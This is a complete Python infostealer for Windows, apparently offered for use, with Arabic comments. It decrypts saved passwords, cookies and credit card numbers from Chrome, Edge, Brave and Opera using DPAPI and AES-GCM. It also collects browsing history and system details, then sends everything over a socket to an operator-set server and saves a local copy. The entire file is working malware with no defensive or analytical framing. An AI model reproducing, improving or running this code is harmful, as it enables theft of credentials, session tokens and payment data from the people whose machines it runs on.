import os
import sqlite3
import json
import socket
import shutil
from pathlib import Path
import win32crypt
from Crypto.Cipher import AES
import base64
import requests
import platform
from datetime import datetime, timedelta
import subprocess


class ImprovedBrowserDataExtractor:
    def __init__(self, server_ip, server_port=5555):
        self.server_ip = server_ip
        self.server_port = server_port
        self.collected_data = ""
        self.master_key = None

    def get_master_key(self, browser_path):
        """الحصول على المفتاح الرئيسي من Local State"""
        try:
            local_state_path = os.path.join(browser_path, "..", "Local State")
            if os.path.exists(local_state_path):
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.loads(f.read())

                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # إزالة DPAPI

                try:
                    self.master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    return True
                except:
                    self.master_key = None
                    return False
        except Exception as e:
            print(f"Error getting master key: {e}")
        return False

    def decrypt_password(self, encrypted_password):
        """فك تشفير كلمات المرور"""
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                # تشفير AES-GCM
                if self.master_key:
                    try:
                        # استخراج nonce و ciphertext و tag
                        nonce = encrypted_password[3:15]
                        ciphertext = encrypted_password[15:-16]
                        tag = encrypted_password[-16:]

                        cipher = AES.new(self.master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted_password = cipher.decrypt_and_verify(ciphertext, tag)
                        return decrypted_password.decode('utf-8')
                    except Exception as e:
                        return f"[AES Decryption Failed: {str(e)}]"

            # تشفير DPAPI القديم
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                return decrypted[1].decode('utf-8')
            except:
                return "[DPAPI Decryption Failed]"

        except Exception as e:
            return f"[Decryption Error: {str(e)}]"

    def get_browser_data(self):
        """جمع بيانات من جميع المتصفحات المتاحة"""
        browsers = {
            'Chrome': self.get_chrome_data,
            'Edge': self.get_edge_data,
            'Brave': self.get_brave_data,
            'Opera': self.get_opera_data
        }

        for browser_name, extractor in browsers.items():
            try:
                self.collected_data += f"\n{'=' * 60}\n"
                self.collected_data += f"{browser_name} BROWSER DATA\n"
                self.collected_data += f"{'=' * 60}\n"
                extractor()
            except Exception as e:
                self.collected_data += f"Error extracting {browser_name} data: {str(e)}\n"

    def get_chrome_data(self):
        """استخراج بيانات Chrome"""
        chrome_path = os.path.join(os.environ['USERPROFILE'],
                                   'AppData', 'Local', 'Google', 'Chrome',
                                   'User Data', 'Default')
        self.get_master_key(chrome_path)
        self.extract_login_data(chrome_path, "Chrome")
        self.extract_cookies(chrome_path, "Chrome")
        self.extract_credit_cards(chrome_path, "Chrome")
        self.extract_history(chrome_path, "Chrome")

    def get_edge_data(self):
        """استخراج بيانات Edge"""
        edge_path = os.path.join(os.environ['USERPROFILE'],
                                 'AppData', 'Local', 'Microsoft', 'Edge',
                                 'User Data', 'Default')
        self.get_master_key(edge_path)
        self.extract_login_data(edge_path, "Edge")
        self.extract_cookies(edge_path, "Edge")
        self.extract_credit_cards(edge_path, "Edge")

    def get_brave_data(self):
        """استخراج بيانات Brave"""
        brave_path = os.path.join(os.environ['USERPROFILE'],
                                  'AppData', 'Local', 'BraveSoftware', 'Brave-Browser',
                                  'User Data', 'Default')
        if os.path.exists(brave_path):
            self.get_master_key(brave_path)
            self.extract_login_data(brave_path, "Brave")
            self.extract_cookies(brave_path, "Brave")

    def get_opera_data(self):
        """استخراج بيانات Opera"""
        opera_path = os.path.join(os.environ['USERPROFILE'],
                                  'AppData', 'Roaming', 'Opera Software', 'Opera Stable')
        if os.path.exists(opera_path):
            self.get_master_key(opera_path)
            self.extract_login_data(opera_path, "Opera")
            self.extract_cookies(opera_path, "Opera")

    def extract_login_data(self, browser_path, browser_name):
        """استخراج بيانات تسجيل الدخول"""
        login_db = os.path.join(browser_path, 'Login Data')

        if os.path.exists(login_db):
            temp_db = "temp_login.db"
            try:
                shutil.copy2(login_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("""
                    SELECT origin_url, username_value, password_value, date_created 
                    FROM logins 
                    WHERE username_value != '' 
                    AND password_value != ''
                """)

                logins_found = False
                for row in cursor.fetchall():
                    url, username, encrypted_password, date_created = row

                    # فك تشفير كلمة المرور
                    decrypted_password = self.decrypt_password(encrypted_password)

                    # تحويل الطابع الزمني
                    if date_created:
                        try:
                            date_str = datetime(1601, 1, 1) + timedelta(microseconds=date_created)
                            date_str = date_str.strftime("%Y-%m-%d %H:%M:%S")
                        except:
                            date_str = "Unknown"
                    else:
                        date_str = "Unknown"

                    self.collected_data += f"URL: {url}\n"
                    self.collected_data += f"Username: {username}\n"
                    self.collected_data += f"Password: {decrypted_password}\n"
                    self.collected_data += f"Created: {date_str}\n"
                    self.collected_data += "-" * 50 + "\n"
                    logins_found = True

                if not logins_found:
                    self.collected_data += "No login data found\n"

            except Exception as e:
                self.collected_data += f"Error reading login data: {str(e)}\n"
            finally:
                try:
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

    def extract_cookies(self, browser_path, browser_name):
        """استخراج الكوكيز"""
        cookies_db = os.path.join(browser_path, 'Cookies')

        if os.path.exists(cookies_db):
            temp_db = "temp_cookies.db"
            try:
                shutil.copy2(cookies_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("""
                    SELECT host_key, name, value, encrypted_value, expires_utc
                    FROM cookies 
                    WHERE host_key LIKE '%%.com' OR host_key LIKE '%%.org'
                    LIMIT 100
                """)

                cookies_found = False
                for row in cursor.fetchall():
                    host, name, value, encrypted_value, expires = row

                    # فك تشفير القيمة إذا لزم الأمر
                    final_value = value
                    if not value and encrypted_value:
                        final_value = self.decrypt_password(encrypted_value)

                    self.collected_data += f"Cookie - {host}: {name} = {final_value}\n"
                    cookies_found = True

                if not cookies_found:
                    self.collected_data += "No cookies found\n"

            except Exception as e:
                self.collected_data += f"Error reading cookies: {str(e)}\n"
            finally:
                try:
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

    def extract_credit_cards(self, browser_path, browser_name):
        """استخراج بطاقات الائتمان المحفوظة"""
        cards_db = os.path.join(browser_path, 'Web Data')

        if os.path.exists(cards_db):
            temp_db = "temp_cards.db"
            try:
                shutil.copy2(cards_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("""
                    SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted
                    FROM credit_cards
                """)

                cards_found = False
                for row in cursor.fetchall():
                    name, exp_month, exp_year, encrypted_card = row

                    # فك تشفير رقم البطاقة
                    decrypted_card = self.decrypt_password(encrypted_card)

                    self.collected_data += f"Credit Card - Name: {name}\n"
                    self.collected_data += f"Number: {decrypted_card}\n"
                    self.collected_data += f"Expires: {exp_month}/{exp_year}\n"
                    self.collected_data += "-" * 50 + "\n"
                    cards_found = True

                if not cards_found:
                    self.collected_data += "No credit cards found\n"

            except Exception as e:
                self.collected_data += f"Error reading credit cards: {str(e)}\n"
            finally:
                try:
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

    def extract_history(self, browser_path, browser_name):
        """استخراج سجل التصفح"""
        history_db = os.path.join(browser_path, 'History')

        if os.path.exists(history_db):
            temp_db = "temp_history.db"
            try:
                shutil.copy2(history_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                cursor.execute("""
                    SELECT url, title, visit_count, last_visit_time 
                    FROM urls 
                    ORDER BY last_visit_time DESC 
                    LIMIT 50
                """)

                self.collected_data += "\nRECENT BROWSING HISTORY:\n"
                history_found = False
                for row in cursor.fetchall():
                    url, title, visit_count, last_visit = row

                    self.collected_data += f"Title: {title}\n"
                    self.collected_data += f"URL: {url}\n"
                    self.collected_data += f"Visits: {visit_count}\n"
                    self.collected_data += "-" * 30 + "\n"
                    history_found = True

                if not history_found:
                    self.collected_data += "No history found\n"

            except Exception as e:
                self.collected_data += f"Error reading history: {str(e)}\n"
            finally:
                try:
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

    def get_system_info(self):
        """جمع معلومات النظام"""
        try:
            self.collected_data += f"\n{'=' * 60}\n"
            self.collected_data += "SYSTEM INFORMATION\n"
            self.collected_data += f"{'=' * 60}\n"

            system_info = {
                "Computer Name": platform.node(),
                "OS": platform.system(),
                "OS Version": platform.version(),
                "Processor": platform.processor(),
                "Architecture": platform.architecture()[0],
                "User": os.environ.get('USERNAME', 'Unknown'),
                "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }

            for key, value in system_info.items():
                self.collected_data += f"{key}: {value}\n"

        except Exception as e:
            self.collected_data += f"Error getting system info: {str(e)}\n"

    def send_to_server(self):
        """إرسال البيانات إلى الخادم"""
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10)
            client_socket.connect((self.server_ip, self.server_port))
            client_socket.send(self.collected_data.encode('utf-8'))
            client_socket.close()
            return True
        except Exception as e:
            print(f"Error sending to server: {e}")
            return False

    def save_to_file(self):
        """حفظ البيانات في ملف محلي"""
        try:
            file_path = os.path.join(os.path.dirname(__file__), "collected_data.txt")
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(self.collected_data)
            return file_path
        except Exception as e:
            print(f"Error saving to file: {e}")
            return None


def main():
    # تغيير هذا العنوان إلى IP الخادم الخاص بك
    SERVER_IP = "127.0.0.1"  # استبدل بـ IP جهازك

    extractor = ImprovedBrowserDataExtractor(SERVER_IP)

    # جمع معلومات النظام
    extractor.get_system_info()

    # جمع بيانات المتصفح
    extractor.get_browser_data()

    # محاولة الإرسال إلى الخادم
    if extractor.send_to_server():
        print("Data sent to server successfully")
    else:
        print("Failed to send to server, saving locally")

    # حفظ البيانات محلياً أيضاً
    local_file = extractor.save_to_file()
    if local_file:
        print(f"Data also saved locally at: {local_file}")


if __name__ == "__main__":
    main()